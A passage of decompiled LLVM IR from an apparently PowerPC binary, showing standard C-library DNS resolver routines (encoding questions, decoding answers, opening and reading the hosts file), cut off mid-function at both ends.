  %v0_1000f378 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f378 = add i32 %v0_1000f378, 2
  %v2_1000f378 = inttoptr i32 %v1_1000f378 to i8*
  %v3_1000f378 = load i8, i8* %v2_1000f378, align 1
  %tmp1 = urem i8 %v3_1000f378, 2
  %v1_1000f37c = zext i8 %tmp1 to i32
  %v2_1000f380 = add i32 %arg2, 20
  %v3_1000f380 = inttoptr i32 %v2_1000f380 to i32*
  store i32 %v1_1000f37c, i32* %v3_1000f380, align 4
  %v0_1000f384 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f384 = add i32 %v0_1000f384, 3
  %v2_1000f384 = inttoptr i32 %v1_1000f384 to i8*
  %v3_1000f384 = load i8, i8* %v2_1000f384, align 1
  %v4_1000f384 = zext i8 %v3_1000f384 to i32
  %v1_1000f388 = call i32 @__asm_rlwinm(i32 %v4_1000f384, i32 25, i32 31, i32 31)
  %v2_1000f38c = add i32 %arg2, 24
  %v3_1000f38c = inttoptr i32 %v2_1000f38c to i32*
  store i32 %v1_1000f388, i32* %v3_1000f38c, align 4
  %v0_1000f390 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f390 = add i32 %v0_1000f390, 3
  %v2_1000f390 = inttoptr i32 %v1_1000f390 to i8*
  %v3_1000f390 = load i8, i8* %v2_1000f390, align 1
  %tmp2 = urem i8 %v3_1000f390, 16
  %v1_1000f394 = zext i8 %tmp2 to i32
  %v2_1000f398 = add i32 %arg2, 28
  %v3_1000f398 = inttoptr i32 %v2_1000f398 to i32*
  store i32 %v1_1000f394, i32* %v3_1000f398, align 4
  %v0_1000f39c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f39c = add i32 %v0_1000f39c, 4
  %v2_1000f39c = inttoptr i32 %v1_1000f39c to i8*
  %v3_1000f39c = load i8, i8* %v2_1000f39c, align 1
  %v4_1000f39c = zext i8 %v3_1000f39c to i32
  %v1_1000f3a0 = add i32 %v0_1000f39c, 5
  %v2_1000f3a0 = inttoptr i32 %v1_1000f3a0 to i8*
  %v3_1000f3a0 = load i8, i8* %v2_1000f3a0, align 1
  %v4_1000f3a0 = zext i8 %v3_1000f3a0 to i32
  %v1_1000f3a4 = mul nuw nsw i32 %v4_1000f39c, 256
  %v2_1000f3a8 = or i32 %v4_1000f3a0, %v1_1000f3a4
  %v2_1000f3ac = add i32 %arg2, 32
  %v3_1000f3ac = inttoptr i32 %v2_1000f3ac to i32*
  store i32 %v2_1000f3a8, i32* %v3_1000f3ac, align 4
  %v0_1000f3b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f3b0 = add i32 %v0_1000f3b0, 6
  %v2_1000f3b0 = inttoptr i32 %v1_1000f3b0 to i8*
  %v3_1000f3b0 = load i8, i8* %v2_1000f3b0, align 1
  %v4_1000f3b0 = zext i8 %v3_1000f3b0 to i32
  %v1_1000f3b4 = add i32 %v0_1000f3b0, 7
  %v2_1000f3b4 = inttoptr i32 %v1_1000f3b4 to i8*
  %v3_1000f3b4 = load i8, i8* %v2_1000f3b4, align 1
  %v4_1000f3b4 = zext i8 %v3_1000f3b4 to i32
  %v1_1000f3b8 = mul nuw nsw i32 %v4_1000f3b0, 256
  %v2_1000f3bc = or i32 %v4_1000f3b4, %v1_1000f3b8
  %v2_1000f3c0 = add i32 %arg2, 36
  %v3_1000f3c0 = inttoptr i32 %v2_1000f3c0 to i32*
  store i32 %v2_1000f3bc, i32* %v3_1000f3c0, align 4
  %v0_1000f3c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f3c4 = add i32 %v0_1000f3c4, 8
  %v2_1000f3c4 = inttoptr i32 %v1_1000f3c4 to i8*
  %v3_1000f3c4 = load i8, i8* %v2_1000f3c4, align 1
  %v4_1000f3c4 = zext i8 %v3_1000f3c4 to i32
  %v1_1000f3c8 = add i32 %v0_1000f3c4, 9
  %v2_1000f3c8 = inttoptr i32 %v1_1000f3c8 to i8*
  %v3_1000f3c8 = load i8, i8* %v2_1000f3c8, align 1
  %v4_1000f3c8 = zext i8 %v3_1000f3c8 to i32
  %v1_1000f3cc = mul nuw nsw i32 %v4_1000f3c4, 256
  %v2_1000f3d0 = or i32 %v4_1000f3c8, %v1_1000f3cc
  %v2_1000f3d4 = add i32 %arg2, 40
  %v3_1000f3d4 = inttoptr i32 %v2_1000f3d4 to i32*
  store i32 %v2_1000f3d0, i32* %v3_1000f3d4, align 4
  %v0_1000f3d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f3d8 = add i32 %v0_1000f3d8, 10
  %v2_1000f3d8 = inttoptr i32 %v1_1000f3d8 to i8*
  %v3_1000f3d8 = load i8, i8* %v2_1000f3d8, align 1
  %v4_1000f3d8 = zext i8 %v3_1000f3d8 to i32
  %v1_1000f3dc = add i32 %v0_1000f3d8, 11
  %v2_1000f3dc = inttoptr i32 %v1_1000f3dc to i8*
  %v3_1000f3dc = load i8, i8* %v2_1000f3dc, align 1
  %v4_1000f3dc = zext i8 %v3_1000f3dc to i32
  store i32 %v4_1000f3dc, i32* %r9.global-to-local, align 4
  %v1_1000f3e0 = mul nuw nsw i32 %v4_1000f3d8, 256
  %v2_1000f3e4 = or i32 %v4_1000f3dc, %v1_1000f3e0
  %v2_1000f3e8 = add i32 %arg2, 44
  %v3_1000f3e8 = inttoptr i32 %v2_1000f3e8 to i32*
  store i32 %v2_1000f3e4, i32* %v3_1000f3e8, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 7, 8, 5, 6, 12, 4, 11, 10, 0, 9, 1, 2, 3 }
  uselistorder i32 11, { 13, 14, 6, 15, 5, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4 }
  uselistorder i32 40, { 8, 9, 2, 11, 10, 0, 3, 4, 5, 6, 7, 1 }
  uselistorder i32 7, { 9, 10, 2, 5, 6, 7, 8, 0, 1, 3, 4, 11 }
  uselistorder i32 5, { 15, 16, 6, 7, 8, 2, 3, 9, 0, 10, 11, 1, 12, 13, 4, 14, 5 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 10, 5, 6, 7, 8, 9, 0, 1, 2, 11, 3, 4, 12, 13, 14, 15 }
  uselistorder i32 28, { 34, 35, 36, 37, 4, 5, 10, 38, 18, 47, 42, 0, 43, 44, 45, 6, 7, 19, 12, 11, 39, 40, 20, 21, 22, 23, 24, 25, 28, 26, 27, 1, 29, 48, 41, 13, 14, 15, 16, 2, 3, 17, 8, 9, 30, 31, 32, 33, 46 }
  uselistorder i32 29, { 9, 12, 13, 10, 11, 8, 2, 14, 3, 15, 0, 1, 16, 17, 4, 5, 20, 21, 18, 19, 6, 7 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000f40c = load i32, i32* %arg1, align 4
  store i32 %v2_1000f40c, i32* %r3.global-to-local, align 4
  store i32 268497940, i32* @lr, align 4
  %v1_1000f410 = inttoptr i32 %v2_1000f40c to i8*
  %v2_1000f410 = call i32 @__encode_dotted(i8* %v1_1000f410)
  store i32 %v2_1000f410, i32* %r3.global-to-local, align 4
  %v1_1000f414 = icmp slt i32 %v2_1000f410, 0
  %v1_1000f418 = load i32, i32* @r29, align 4
  %v2_1000f418 = sub i32 %v1_1000f418, %v2_1000f410
  store i32 %v2_1000f418, i32* @r29, align 4
  br i1 %v1_1000f414, label %dec_label_pc_1000f458, label %dec_label_pc_1000f424

dec_label_pc_1000f424:                            ; preds = %entry
  %v2_1000f41c = icmp sgt i32 %v2_1000f418, 3
  %v0_1000f424 = load i32, i32* @r30, align 4
  %v2_1000f424 = add i32 %v0_1000f424, %v2_1000f410
  store i32 %v2_1000f424, i32* %r9.global-to-local, align 4
  br i1 %v2_1000f41c, label %dec_label_pc_1000f434, label %dec_label_pc_1000f42c

dec_label_pc_1000f42c:                            ; preds = %dec_label_pc_1000f424
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f458

dec_label_pc_1000f434:                            ; preds = %dec_label_pc_1000f424
  %v0_1000f434 = load i32, i32* @r31, align 4
  %v1_1000f434 = add i32 %v0_1000f434, 6
  %v2_1000f434 = inttoptr i32 %v1_1000f434 to i8*
  %v3_1000f434 = load i8, i8* %v2_1000f434, align 1
  %v5_1000f438 = inttoptr i32 %v2_1000f424 to i8*
  store i8 %v3_1000f434, i8* %v5_1000f438, align 1
  %v0_1000f43c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f43c = add i32 %v0_1000f43c, 4
  store i32 %v1_1000f43c, i32* %r3.global-to-local, align 4
  %v0_1000f440 = load i32, i32* @r31, align 4
  %v1_1000f440 = add i32 %v0_1000f440, 4
  %v2_1000f440 = inttoptr i32 %v1_1000f440 to i32*
  %v3_1000f440 = load i32, i32* %v2_1000f440, align 4
  %v1_1000f444 = trunc i32 %v3_1000f440 to i8
  %v2_1000f444 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f444 = add i32 %v2_1000f444, 1
  %v4_1000f444 = inttoptr i32 %v3_1000f444 to i8*
  store i8 %v1_1000f444, i8* %v4_1000f444, align 1
  %v0_1000f448 = load i32, i32* @r31, align 4
  %v1_1000f448 = add i32 %v0_1000f448, 10
  %v2_1000f448 = inttoptr i32 %v1_1000f448 to i8*
  %v3_1000f448 = load i8, i8* %v2_1000f448, align 1
  %v2_1000f44c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f44c = add i32 %v2_1000f44c, 2
  %v4_1000f44c = inttoptr i32 %v3_1000f44c to i8*
  store i8 %v3_1000f448, i8* %v4_1000f44c, align 1
  %v0_1000f450 = load i32, i32* @r31, align 4
  %v1_1000f450 = add i32 %v0_1000f450, 8
  %v2_1000f450 = inttoptr i32 %v1_1000f450 to i32*
  %v3_1000f450 = load i32, i32* %v2_1000f450, align 4
  %v1_1000f454 = trunc i32 %v3_1000f450 to i8
  %v2_1000f454 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f454 = add i32 %v2_1000f454, 3
  %v4_1000f454 = inttoptr i32 %v3_1000f454 to i8*
  store i8 %v1_1000f454, i8* %v4_1000f454, align 1
  %v0_1000f468.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f458

dec_label_pc_1000f458:                            ; preds = %entry, %dec_label_pc_1000f42c, %dec_label_pc_1000f434
  %v0_1000f468 = phi i32 [ %v2_1000f410, %entry ], [ -1, %dec_label_pc_1000f42c ], [ %v0_1000f468.pre, %dec_label_pc_1000f434 ]
  ret i32 %v0_1000f468

; uselistorder directives
  uselistorder i32 %v2_1000f410, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder label %dec_label_pc_1000f458, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268498044, i32* @lr, align 4
  %v0_1000f478 = call i32 @__length_dotted()
  %v1_1000f47c = icmp slt i32 %v0_1000f478, 0
  br i1 %v1_1000f47c, label %dec_label_pc_1000f488, label %dec_label_pc_1000f484

dec_label_pc_1000f484:                            ; preds = %entry
  %v1_1000f484 = add i32 %v0_1000f478, 4
  br label %dec_label_pc_1000f488

dec_label_pc_1000f488:                            ; preds = %entry, %dec_label_pc_1000f484
  %v0_1000f494 = phi i32 [ %v0_1000f478, %entry ], [ %v1_1000f484, %dec_label_pc_1000f484 ]
  ret i32 %v0_1000f494

; uselistorder directives
  uselistorder label %dec_label_pc_1000f488, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000f49c = load i32, i32* @lr, align 4
  store i32 %v0_1000f49c, i32* %r0.global-to-local, align 4
  %v2_1000f4a4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000f4a4, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268498120, i32* @lr, align 4
  %v2_1000f4c4 = call i32 @__decode_dotted(i32 %v2_1000f4a4, i32 256)
  store i32 %v2_1000f4c4, i32* @r27, align 4
  %v1_1000f4c8 = icmp slt i32 %v2_1000f4c4, 0
  %v0_1000f4cc = load i32, i32* @r28, align 4
  %v2_1000f4cc = add i32 %v0_1000f4cc, %v2_1000f4c4
  store i32 %v2_1000f4cc, i32* @r28, align 4
  %v1_1000f4d0 = load i32, i32* @r29, align 4
  %v2_1000f4d0 = sub i32 %v1_1000f4d0, %v2_1000f4cc
  %v1_1000f4d4 = add i32 %v2_1000f4d0, -10
  br i1 %v1_1000f4c8, label %dec_label_pc_1000f590, label %dec_label_pc_1000f4e0

dec_label_pc_1000f4e0:                            ; preds = %entry
  %v0_1000f4e4 = load i32, i32* @r26, align 4
  %v2_1000f4e4 = add i32 %v0_1000f4e4, %v2_1000f4cc
  store i32 %v2_1000f4e4, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000f4d4, -1
  br i1 %tmp6, label %dec_label_pc_1000f4f4, label %dec_label_pc_1000f4ec

dec_label_pc_1000f4ec:                            ; preds = %dec_label_pc_1000f4e0
  store i32 %v1_1000f4d4, i32* @r27, align 4
  br label %dec_label_pc_1000f590

dec_label_pc_1000f4f4:                            ; preds = %dec_label_pc_1000f4e0
  store i32 268498168, i32* @lr, align 4
  %v1_1000f4f4 = call i32 @__GI_strdup(i32 %v2_1000f4a4)
  %v0_1000f4f8 = load i32, i32* @r30, align 4
  %v1_1000f4f8 = add i32 %v0_1000f4f8, 2
  store i32 %v1_1000f4f8, i32* %r8.global-to-local, align 4
  %v1_1000f4fc = load i32, i32* @r31, align 4
  %v2_1000f4fc = inttoptr i32 %v1_1000f4fc to i32*
  store i32 %v1_1000f4f4, i32* %v2_1000f4fc, align 4
  %v0_1000f500 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f500 = add i32 %v0_1000f500, 2
  store i32 %v1_1000f500, i32* %r10.global-to-local, align 4
  %v0_1000f504 = load i32, i32* @r30, align 4
  %v1_1000f504 = add i32 %v0_1000f504, 10
  store i32 %v1_1000f504, i32* %r6.global-to-local, align 4
  %v0_1000f508 = load i32, i32* @r26, align 4
  %v1_1000f508 = load i32, i32* @r28, align 4
  %v2_1000f508 = add i32 %v1_1000f508, %v0_1000f508
  %v3_1000f508 = inttoptr i32 %v2_1000f508 to i8*
  %v4_1000f508 = load i8, i8* %v3_1000f508, align 1
  %v5_1000f508 = zext i8 %v4_1000f508 to i32
  store i32 %v5_1000f508, i32* %r0.global-to-local, align 4
  %v1_1000f50c = add i32 %v0_1000f504, 1
  %v2_1000f50c = inttoptr i32 %v1_1000f50c to i8*
  %v3_1000f50c = load i8, i8* %v2_1000f50c, align 1
  %v4_1000f50c = zext i8 %v3_1000f50c to i32
  store i32 %v4_1000f50c, i32* %r9.global-to-local, align 4
  %v1_1000f510 = mul nuw nsw i32 %v5_1000f508, 256
  %v2_1000f514 = or i32 %v4_1000f50c, %v1_1000f510
  store i32 %v2_1000f514, i32* %r0.global-to-local, align 4
  %v1_1000f518 = load i32, i32* @r31, align 4
  %v2_1000f518 = add i32 %v1_1000f518, 4
  %v3_1000f518 = inttoptr i32 %v2_1000f518 to i32*
  store i32 %v2_1000f514, i32* %v3_1000f518, align 4
  %v0_1000f51c = load i32, i32* @r30, align 4
  %v1_1000f51c = add i32 %v0_1000f51c, 2
  %v2_1000f51c = inttoptr i32 %v1_1000f51c to i8*
  %v3_1000f51c = load i8, i8* %v2_1000f51c, align 1
  %v4_1000f51c = zext i8 %v3_1000f51c to i32
  store i32 %v4_1000f51c, i32* %r0.global-to-local, align 4
  %v0_1000f520 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f520 = add i32 %v0_1000f520, 1
  %v2_1000f520 = inttoptr i32 %v1_1000f520 to i8*
  %v3_1000f520 = load i8, i8* %v2_1000f520, align 1
  %v4_1000f520 = zext i8 %v3_1000f520 to i32
  store i32 %v4_1000f520, i32* %r9.global-to-local, align 4
  %v1_1000f524 = mul nuw nsw i32 %v4_1000f51c, 256
  %v2_1000f528 = or i32 %v4_1000f520, %v1_1000f524
  store i32 %v2_1000f528, i32* %r0.global-to-local, align 4
  %v1_1000f52c = load i32, i32* @r31, align 4
  %v2_1000f52c = add i32 %v1_1000f52c, 8
  %v3_1000f52c = inttoptr i32 %v2_1000f52c to i32*
  store i32 %v2_1000f528, i32* %v3_1000f52c, align 4
  %v0_1000f530 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f530 = add i32 %v0_1000f530, 2
  %v2_1000f530 = inttoptr i32 %v1_1000f530 to i8*
  %v3_1000f530 = load i8, i8* %v2_1000f530, align 1
  %v4_1000f530 = zext i8 %v3_1000f530 to i32
  store i32 %v4_1000f530, i32* %r0.global-to-local, align 4
  %v0_1000f534 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f534 = add i32 %v0_1000f534, 1
  %v2_1000f534 = inttoptr i32 %v1_1000f534 to i8*
  %v3_1000f534 = load i8, i8* %v2_1000f534, align 1
  %v4_1000f534 = zext i8 %v3_1000f534 to i32
  store i32 %v4_1000f534, i32* %r11.global-to-local, align 4
  %v1_1000f538 = add i32 %v0_1000f534, 3
  %v2_1000f538 = inttoptr i32 %v1_1000f538 to i8*
  %v3_1000f538 = load i8, i8* %v2_1000f538, align 1
  %v4_1000f538 = zext i8 %v3_1000f538 to i32
  %v1_1000f53c = mul nuw i32 %v4_1000f530, 16777216
  store i32 %v1_1000f53c, i32* %r0.global-to-local, align 4
  %v1_1000f540 = add i32 %v0_1000f534, 2
  %v2_1000f540 = inttoptr i32 %v1_1000f540 to i8*
  %v3_1000f540 = load i8, i8* %v2_1000f540, align 1
  %v4_1000f540 = zext i8 %v3_1000f540 to i32
  %v1_1000f544 = mul nuw nsw i32 %v4_1000f534, 65536
  %v2_1000f548 = or i32 %v1_1000f544, %v1_1000f53c
  %v0_1000f54c = load i32, i32* @r28, align 4
  %v1_1000f54c = add i32 %v0_1000f54c, 10
  store i32 %v1_1000f54c, i32* %r11.global-to-local, align 4
  %v2_1000f550 = or i32 %v2_1000f548, %v4_1000f538
  store i32 %v2_1000f550, i32* %r0.global-to-local, align 4
  %v1_1000f554 = mul nuw nsw i32 %v4_1000f540, 256
  %v2_1000f558 = or i32 %v1_1000f554, %v2_1000f550
  store i32 %v2_1000f558, i32* %r9.global-to-local, align 4
  %v1_1000f55c = load i32, i32* @r31, align 4
  %v2_1000f55c = add i32 %v1_1000f55c, 12
  %v3_1000f55c = inttoptr i32 %v2_1000f55c to i32*
  store i32 %v2_1000f558, i32* %v3_1000f55c, align 4
  %v0_1000f560 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f560 = add i32 %v0_1000f560, 6
  %v2_1000f560 = inttoptr i32 %v1_1000f560 to i8*
  %v3_1000f560 = load i8, i8* %v2_1000f560, align 1
  %v4_1000f560 = zext i8 %v3_1000f560 to i32
  store i32 %v4_1000f560, i32* %r9.global-to-local, align 4
  %v0_1000f564 = load i32, i32* @r30, align 4
  %v1_1000f564 = add i32 %v0_1000f564, 9
  %v2_1000f564 = inttoptr i32 %v1_1000f564 to i8*
  %v3_1000f564 = load i8, i8* %v2_1000f564, align 1
  %v4_1000f564 = zext i8 %v3_1000f564 to i32
  store i32 %v4_1000f564, i32* %r0.global-to-local, align 4
  %v1_1000f568 = mul nuw nsw i32 %v4_1000f560, 256
  store i32 %v1_1000f568, i32* %r9.global-to-local, align 4
  %v0_1000f56c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f56c = load i32, i32* @r31, align 4
  %v2_1000f56c = add i32 %v1_1000f56c, 24
  %v3_1000f56c = inttoptr i32 %v2_1000f56c to i32*
  store i32 %v0_1000f56c, i32* %v3_1000f56c, align 4
  %v0_1000f570 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f570 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f570 = or i32 %v1_1000f570, %v0_1000f570
  store i32 %v2_1000f570, i32* %r9.global-to-local, align 4
  %v0_1000f574 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000f574 = load i32, i32* @r31, align 4
  %v2_1000f574 = add i32 %v1_1000f574, 20
  %v3_1000f574 = inttoptr i32 %v2_1000f574 to i32*
  store i32 %v0_1000f574, i32* %v3_1000f574, align 4
  %v0_1000f578 = load i32, i32* @r29, align 4
  %v1_1000f578 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f578 = icmp slt i32 %v0_1000f578, %v1_1000f578
  %v1_1000f57c = add i32 %v1_1000f578, 10
  store i32 %v1_1000f57c, i32* %r0.global-to-local, align 4
  %v0_1000f580 = load i32, i32* @r27, align 4
  %v2_1000f580 = add i32 %v0_1000f580, %v1_1000f57c
  store i32 %v2_1000f580, i32* @r27, align 4
  %v1_1000f584 = load i32, i32* @r31, align 4
  %v2_1000f584 = add i32 %v1_1000f584, 16
  %v3_1000f584 = inttoptr i32 %v2_1000f584 to i32*
  store i32 %v1_1000f578, i32* %v3_1000f584, align 4
  br i1 %v2_1000f578, label %dec_label_pc_1000f58c, label %dec_label_pc_1000f4f4.dec_label_pc_1000f590_crit_edge

dec_label_pc_1000f4f4.dec_label_pc_1000f590_crit_edge: ; preds = %dec_label_pc_1000f4f4
  %v0_1000f594.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000f590

dec_label_pc_1000f58c:                            ; preds = %dec_label_pc_1000f4f4
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000f590

dec_label_pc_1000f590:                            ; preds = %dec_label_pc_1000f4f4.dec_label_pc_1000f590_crit_edge, %entry, %dec_label_pc_1000f4ec, %dec_label_pc_1000f58c
  %v0_1000f594 = phi i32 [ %v0_1000f594.pre, %dec_label_pc_1000f4f4.dec_label_pc_1000f590_crit_edge ], [ %v2_1000f4c4, %entry ], [ %v1_1000f4d4, %dec_label_pc_1000f4ec ], [ -1, %dec_label_pc_1000f58c ]
  store i32 %v0_1000f49c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f594

; uselistorder directives
  uselistorder i32 %v1_1000f578, { 1, 0, 2 }
  uselistorder i32 %v1_1000f53c, { 1, 0 }
  uselistorder i32 %v1_1000f4d4, { 1, 2, 0 }
  uselistorder i32 %v2_1000f4c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f4a4, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 29, 30, 31, 32, 1, 14, 33, 34, 15, 16, 17, 18, 5, 6, 27, 7, 0, 38, 39, 19, 20, 21, 22, 23, 25, 26, 24, 37, 35, 8, 9, 10, 11, 12, 13, 4, 28, 2, 3, 36 }
  uselistorder i32 9, { 17, 18, 19, 20, 1, 8, 2, 9, 3, 10, 0, 11, 12, 13, 14, 15, 4, 5, 6, 7, 16, 21, 22 }
  uselistorder i32 65536, { 0, 34, 1, 2, 3, 4, 6, 5, 7, 8, 9, 37, 35, 10, 12, 11, 13, 36, 14, 16, 15, 17, 19, 18, 20, 21, 22, 25, 24, 23, 27, 28, 26, 29, 31, 32, 30, 33 }
  uselistorder i32 3, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 35, 2, 0, 8, 18, 20, 19, 10, 21, 52, 9, 57, 3, 53, 54, 36, 37, 22, 38, 39, 30, 32, 58, 59, 31, 62, 33, 14, 4, 5, 55, 60, 61, 6, 67, 68, 69, 63, 64, 65, 66, 12, 41, 40, 51, 7, 13, 34, 15, 23, 16, 24, 25, 56, 26, 27, 28, 17, 29, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 0, 2, 1 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 52, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 44, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 50, 51, 55, 25, 26, 27, 28, 29, 54, 47, 30, 31, 32, 33, 53, 34, 35, 36, 37, 38, 39, 40, 45, 48, 41, 42, 43 }
  uselistorder label %dec_label_pc_1000f590, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_1000f5ac = load i32, i32* @lr, align 4
  store i32 268498384, i32* @lr, align 4
  %v3_1000f5cc = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_10012b78.412 to i32), i32 ptrtoint (i32* @global_var_10012b14.382 to i32))
  %v3_1000f5d4 = icmp eq i32 %v3_1000f5cc, 0
  br i1 %v3_1000f5d4, label %dec_label_pc_1000f5dc, label %dec_label_pc_1000f5f8

dec_label_pc_1000f5dc:                            ; preds = %entry
  %v0_1000f5d0 = load i32, i32* @r29, align 4
  store i32 %v0_1000f5ac, i32* @lr, align 4
  %v3_1000f5f4 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_10012b84.413 to i32), i32 %v0_1000f5d0)
  br label %dec_label_pc_1000f5f8

dec_label_pc_1000f5f8:                            ; preds = %entry, %dec_label_pc_1000f5dc
  %v0_1000f608 = phi i32 [ %v3_1000f5cc, %entry ], [ %v3_1000f5f4, %dec_label_pc_1000f5dc ]
  ret i32 %v0_1000f608

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder label %dec_label_pc_1000f5f8, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000f60c = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_1000f620 = sub i32 0, %arg6
  %v1_1000f624 = urem i32 %v1_1000f620, 4
  store i32 %v1_1000f624, i32* %r0.global-to-local, align 4
  %v3_1000f624 = icmp eq i32 %v1_1000f624, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000f63c = load i32, i32* @r10, align 4
  store i32 %v0_1000f63c, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000f658.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000f624, label %dec_label_pc_1000f658, label %dec_label_pc_1000f648

dec_label_pc_1000f648:                            ; preds = %entry
  %v2_1000f648 = icmp ult i32 %v0_1000f658.pr, %v1_1000f624
  br i1 %v2_1000f648, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f650

dec_label_pc_1000f650:                            ; preds = %dec_label_pc_1000f648
  %v2_1000f650 = sub i32 %v0_1000f658.pr, %v1_1000f624
  store i32 %v2_1000f650, i32* %r9.global-to-local, align 4
  %v2_1000f654 = add i32 %v1_1000f624, %arg6
  store i32 %v2_1000f654, i32* @r30, align 4
  br label %dec_label_pc_1000f658

dec_label_pc_1000f658:                            ; preds = %entry, %dec_label_pc_1000f650
  %v0_1000f664 = phi i32 [ %v2_1000f654, %dec_label_pc_1000f650 ], [ %arg6, %entry ]
  %v0_1000f668 = phi i32 [ %v2_1000f650, %dec_label_pc_1000f650 ], [ %v0_1000f658.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_1000f668, 32
  br i1 %tmp49, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f660

dec_label_pc_1000f660:                            ; preds = %dec_label_pc_1000f658
  %v3_1000f660 = icmp eq i32 %arg4, 1
  %v1_1000f664 = add i32 %v0_1000f664, 32
  store i32 %v1_1000f664, i32* @r24, align 4
  %v1_1000f668 = add i32 %v0_1000f668, -32
  store i32 %v1_1000f668, i32* @r27, align 4
  br i1 %v3_1000f660, label %dec_label_pc_1000f768, label %dec_label_pc_1000f670

dec_label_pc_1000f670:                            ; preds = %dec_label_pc_1000f660
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000f678 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000f678, align 4
  %tmp50 = icmp ult i32 %v1_1000f668, 4
  br i1 %tmp50, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f680

